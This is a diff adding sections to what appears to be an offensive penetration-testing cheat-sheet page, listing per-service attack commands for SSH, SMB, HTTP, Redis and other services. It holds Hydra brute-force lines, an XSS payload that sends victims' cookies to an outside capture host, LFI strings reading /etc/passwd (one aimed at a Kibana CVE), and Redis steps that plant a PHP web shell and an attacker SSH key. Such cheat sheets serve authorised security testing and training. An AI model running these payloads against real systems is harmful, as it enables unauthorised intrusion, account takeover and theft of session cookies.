@@ -94,6 +94,325 @@ details[open]
   <p># hydra -L 'listuser' -P 'listpass' -Vv 'host' ftp </p>
 </details>
 </details>   
+          
+<details >
+<summary >SSH </summary> <span> ⚙️ 22 </span>
+<details >
+<summary > &nbsp; &nbsp;  ➜  Vulnerable version ? : </summary>
+  <p > <a href="https://www.exploit-db.com" target="_blank" class="lien2"/> exploitDB </a> </p>
+  <p > # Searchsploit 'ssh Version' </p>
+</details>
+    <details >
+<summary > &nbsp; &nbsp;  ➜  Bruteforce - Hydra : </summary>
+  <p ># hydra -L 'listuser' -P 'listpass' -Vv 'host' ssh </p>
+</details> 
+</details>    
+    
+<details  >
+<summary >TELNET </summary> <span> ⚙️ 23 </span> 
+        <details >
+<summary > &nbsp; &nbsp;  ➜ Telnet Version [Metasploit] : </summary>
+  <p ># msf > use auxiliary/scanner/telnet/telnet_version  </p>
+</details> 
+          <details >
+<summary > &nbsp; &nbsp;  ➜ Bruteforce -Hydra : </summary>
+  <p >#  hydra -L 'listuser' -P 'listpass' 'host' -Vv telnet  </p>
+</details> 
+   </details>    
+        
+<details >
+<summary >SMTP</summary>  <span> ⚙️ 25,465,587 </span>
+<details >
+<summary > &nbsp; &nbsp;  ➜  Scanner SMTP [Metasploit] : </summary>
+  <p > msf > use auxiliary/scanner/smtp/smtp_enum </p>
+</details>
+</details>    
+ 
+<details >
+<summary >DNS</summary>  <span> ⚙️ 53 </span>
+<details >
+<summary > &nbsp; &nbsp;  ➜ DNS Information :</summary>
+    <p > <a href=" https://www.nom-domaine.fr/whois.html" target="_blank" class="lien2"/> Whois </a> </p>
+</details>
+<details >
+<summary > &nbsp; &nbsp;  ➜  DNSrecon : </summary>
+  <p ># dnsrecon -d 'host.com' </p>
+</details>
+</details>    
+         
+<details >
+<summary >HTTP </summary> <span> ⚙️ 80,8080,443 </span> 
+<details >
+<summary > &nbsp; &nbsp;  ➜  Check Code Source : </summary>
+  <p > 'Ctrl+U' </p>
+</details>
+    <details >
+<summary > &nbsp; &nbsp;  ➜  URL Scanning : </summary>
+  <p ># dirb 'url' </p>
+  <p ># nikto 'url' </p>
+   <p ># gobuster 'url' </p>
+</details>
+    <details >
+<summary > &nbsp; &nbsp;  ➜  Bruteforce - Hydra : </summary>
+  <p >#hydra -L 'user.txt -P pass.txt 'ip' http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed"</p>
+  </details>
+  <details >
+<summary > &nbsp; &nbsp;  ➜  SQL Injection :  </summary>
+  <p ># sqlmap -u 'host'  </p>
+    <p> Cheat Sheet :  </p> 
+    <p > <a href=" https://www.asafety.fr/mysql-injection-cheat-sheet/" target="_blank" class="lien2"/> Sql Cheat Sheet </a> </p>
+    <p > <a href=" https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/" target="_blank" class="lien2"/> Sql Cheat Sheet2 </a> </p>
+</details>
+    <details >
+<summary > &nbsp; &nbsp;  ➜  XSS :  </summary>
+  <p > < scrīpt> alert("test")< /script> </p>
+  <p > < scrīpt> alert(document.cookie)< /script> </p>
+  <p> Steal Admin cookie via XSS </p>
+  <p > <scrīpt>document.location=`https://postb.in/b/1234?c=`+document.cookie;< /script> </p>
+  <p> Capture HTTP Requests </p>
+  <p > <a href=" https://hookbin.com/  " target="_blank" class="liebn2"/> hookbin-Requet Capture </a> </p>
+</details>
+    <details >
+<summary > &nbsp; &nbsp;  ➜  Lfi Exploit :  </summary>
+  <p > url : ?id=var/../../../../../../../../etc/passwd  </p>
+  <p >  <a href=" https://highon.coffee/blog/lfi-cheat-sheet/" target="_blank" class="lien2"/> LFI Cheat Sheet </a>  </p>
+</details>
+    <details >
+<summary > &nbsp; &nbsp;  ➜  Command Injection :  </summary>
+  <p >  <a href=" https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" target="_blank" class="lien2"/> Command Injection Cheat Sheet </a>  </p>
+</details>
+    <details >
+<summary > &nbsp; &nbsp;  ➜  Wordpress :  </summary>
+  <p> Configuration File:wp-config.php </p>
+  <p > #wpsan --url 'host' </p>
+  <p > #wpsan --url 'host' --enumerate u </p>
+  </details>
+      <details >
+<summary > &nbsp; &nbsp;  ➜  Tomcat :  </summary>
+  <p> Vulnerable version ? </p>
+  <p > <a href="https://www.exploit-db.com" target="_blank" class="lien2"/> exploitDB </a> </p>
+<p> Tomcat Enumeration / Metasploit : </p>
+  <p ># use auxiliary/scanner/http/tomcat_enum  </p>
+  </details>
+      <details >
+
+<summary > &nbsp; &nbsp;  ➜  Drupal :  </summary>
+  <p> Metasploit :  </p>
+  <p ># use auxiliary/scanner/http/drupal_views_user_enum  </p>
+  <p> Bruteforce :  </p>
+  <p > <a href=" http://www.madirish.net/408 " target="_blank" class="lien2"/> Drupal Bruteforce </a> </p>
+  </details>
+   </details>    
+ 
+       <details >
+<summary >NTP</summary>  <span> ⚙️ 123 </span> 
+<details >
+<summary > &nbsp; &nbsp;  ➜  Ntpq : </summary>
+  <p ># ntpq -c readlist 'host' <br />
+# ntpq -c readvar <IP_ADDRESS> <br />
+# ntpq -c peers <IP_ADDRESS> <br />
+# ntpq -c associations <IP_ADDRESS> <br />
+# ntpdc -c monlist <IP_ADDRESS> <br />
+# ntpdc -c listpeers <IP_ADDRESS> <br />
+# ntpdc -c sysinfo <IP_ADDRESS> <br />
+ </p>
+</details>
+  <details >
+<summary > &nbsp; &nbsp;  ➜  Nmap : </summary>
+  <p ># nmap -sU -sV --script "ntp" 'host' </p>
+</details>
+</details>   
+               <details >
+<summary >NETBIOS</summary>  <span> ⚙️ 137,139 </span>
+<details >
+<summary > &nbsp; &nbsp;  ➜ Nbtscan : </summary>
+  <p > # nbtscan -r 'host' </p>
+</details>
+</details>  
+    
+<details >
+<summary >SNMP</summary> <span> ⚙️  161,162 </span>
+<details >
+<summary > &nbsp; &nbsp;  ➜ snmpwalk : </summary>
+  <p > # snmpwalk 'host' </p>
+</details>
+    <details >
+<summary > &nbsp; &nbsp;  ➜  SNMP-Check : </summary>
+  <p ># snmp-check 'host' -p 'port'  </p>
+</details> 
+      <details >
+<summary > &nbsp; &nbsp;  ➜  Nmap Enum : </summary>
+  <p ># nmap --script snmp 'host' </p>
+</details> 
+</details>    
+    
+                       <details >
+<summary >LDAP</summary> <span> ⚙️ 389 </span>
+<details >
+<summary > &nbsp; &nbsp;  ➜  Serveur Information Using Python:  </summary>
+  <p > >>> import ldap3  <br />
+>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True) <br />
+>>> connection = ldap3.Connection(server) <br />
+>>> connection.bind() <br />
+True <br />
+>>> server.info <br />
+DSA info (from DSE):<br />
+Supported LDAP versions: 3<br />
+Naming contexts: <br />
+dc=DOMAIN,dc=DOMAIN<br />
+    </p> 
+</details>
+</details>   
+ 
+<details >
+  <summary >SMB</summary> <span> ⚙️ 445 </span> 
+  <details >
+<summary > &nbsp; &nbsp;  ➜ Vulnerable version ? : </summary>
+  <p > <a href="https://www.exploit-db.com" target="_blank" class="lien2"/> exploitDB </a> </p>
+  <p > # Searchsploit 'smb Version' </p>
+</details>  
+<details >
+<summary > &nbsp; &nbsp;  ➜  Enum4linux : </summary>
+  <p ># enum4linux -a 'Host' </p>
+</details>
+  <details >
+<summary > &nbsp; &nbsp;  ➜  Bruteforce - Hydra : </summary>
+  <p ># hydra -L 'user' -P 'pass' -Vv 'host' smb </p>
+</details>
+    <details >
+<summary > &nbsp; &nbsp;  ➜  Smbclient : </summary>
+  <p class= "para"> # smbclient -L 'host' </p>
+</details>
+    <details >
+<summary > &nbsp; &nbsp;  ➜  Rpcclient  :</summary>
+  <p class= "para"> # rpcclient -U "" -N 'host' </p>
+</details>
+    <details >
+<summary > &nbsp; &nbsp;  ➜  SMB version [Metasploit] :</summary>
+  <p class= "para">#  msf > use auxiliary/scanner/smb/smb_version </p>
+</details>
+</details>  
+       
+     <details >
+  <summary >NFS</summary> <span> ⚙️ 2049 </span>
+ <details >
+<summary > &nbsp; &nbsp;  ➜ Liste share : </summary>
+  <p > # showmount -e 'host' </p>
+</details>  
+  <details >
+<summary > &nbsp; &nbsp;  ➜  Mount Point : </summary>
+  <p ># mount -t 'type' /path/mount/device /path/destination </p>
+</details>
+    <details >
+<summary > &nbsp; &nbsp;  ➜ Nmap Enum : </summary>
+  <p > # nmap --script=nfs-ls,nfs-statfs,nfs-showmount </p>
+</details>
+   </details>     
+    
+    <details >
+  <summary >MYSQL</summary> <span> ⚙️ 3306 </span>
+ <details >
+<summary > &nbsp; &nbsp;  ➜ Vulnerable version ? : </summary>
+  <p > <a href="https://www.exploit-db.com" target="_blank" class="lien2"/> exploitDB </a> </p>
+  <p > # Searchsploit 'mysql Version' </p>
+</details>  
+  <details >
+<summary > &nbsp; &nbsp;  ➜  nmap : </summary>
+  <p ># nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 'host'
+ </p>
+</details>
+    <details >
+<summary > &nbsp; &nbsp;  ➜  Enumeration [Metasploit] : </summary>
+  <p >  msf> use auxiliary/scanner/mysql/mysql_version  <br />
+msf> use uxiliary/scanner/mysql/mysql_authbypass_hashdump  <br />
+</p>
+</details>
+   </details>  
+     
+                 <details >
+  <summary >Stack ELK</summary> <span> ⚙️ 9200, 5044, 5601 </span> 
+<details >
+<summary > &nbsp; &nbsp;  ➜  Elastic Search Enumeration : </summary>
+  <p > <a href="https://book.hacktricks.xyz/pentesting/9200-pentesting-elasticsearch" target="_blank" class="lien2"/> HackTricks - ElasticSearch </a> </p>
+</details>
+  <details >
+<summary > &nbsp; &nbsp;  ➜ ELK search strings </summary>
+  <p > curl -X GET "X.X.X.X:9200/_search?q=password" </p>
+</details> 
+  <details >
+<summary > &nbsp; &nbsp;  ➜ Kibana LFI < 6.4.3 & 5.6.13 </summary>
+  <p > /api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../etc/passwd </p>
+  <p > <a href=" https://github.com/mpgn/CVE-2018-17246 " target="_blank" class="lien2"/> LFI exploit Kibana - Github </a> </p>
+</details> 
+</details>
+         
+        <details >
+  <summary >VNC</summary> <span> ⚙️ 58000 </span> 
+<details >
+<summary > &nbsp; &nbsp;  ➜  Vulnerable version ? : </summary>
+  <p > <a href="https://www.exploit-db.com" target="_blank" class="lien2"/> exploitDB </a> </p>
+  <p > # Searchsploit 'vnc Version' </p>
+</details>
+  <details >
+<summary > &nbsp; &nbsp;  ➜ Bruteforce - Hydra </summary>
+  <p ># hydra -L 'user' -P 'pass' -Vv 'host' vnc </p>
+</details> 
+</details>
+
+        <details >
+  <summary >REDIS</summary> <span> ⚙️ 6379 </span> 
+<details >
+<summary > &nbsp; &nbsp;  ➜  Enum - Nmap / Metasploit : </summary>
+  <p >  #nmap --script redis-info -sV -p 6379 'host' <br/>
+#msf> use auxiliary/scanner/redis/redis_server</p>
+</details>
+  <details >
+<summary > &nbsp; &nbsp;  ➜  redis-cli  </summary>
+  <p ># redis-cli -h 'host' </p>
+</details> 
+  <details >
+<summary > &nbsp; &nbsp;  ➜  redis-WebShell  </summary>
+  <p >
+> config set dir /usr/share/nginx/html  <br/>
+OK  <br/>
+> config set dbfilename redis.php  <br/>
+OK  <br/>
+> set test ''< ? php phpinfo() ; ? >'' <br/> 
+OK  <br/> 
+> save  <br/> 
+OK </p>
+</details> 
+           <details >
+<summary > &nbsp; &nbsp;  ➜  redis-SSH  </summary>
+  <p >  
+    #ssh-keygen -t rsa  <br />
+    #(echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > rsa.txt  <br />
+   # cat rsa.txt | redis-cli -h 10.85.0.52 -x set crackit  <br />
+# redis-cli -h 'host'  <br />
+    >config set dir /home/test/.ssh/  <br />
+OK  <br />
+> config set dbfilename "authorized_keys"  <br />
+OK  <br />
+> save <br />
+OK <br /> 
+             </p>
+</details> 
+           <details >
+<summary > &nbsp; &nbsp;  ➜  Redis - SSRF  </summary>
+   <p > <a href="https://github.com/tarunkant/Gopherus " target="_blank" class="lien2"/> Gopherus </a> </p>
+   <p ># python gopherus.py --exploit redis </p>
+</details> 
+</details> 
+
+<details >
+<summary >GITHUB REPO </summary> <span> ⚙️ 9418 </span> 
+<details >
+<summary > &nbsp; &nbsp;  ➜ Git Dumper : </summary>
+  <p > <a href="https://github.com/arthaud/git-dumper" target="_blank" class="lien2"/> GitDumper </a> </p>
+</details>
+</details>
+
+
   </br>
 <h2 id="privilege-escalation">II. Privilege Escalation</h2>
 </br>
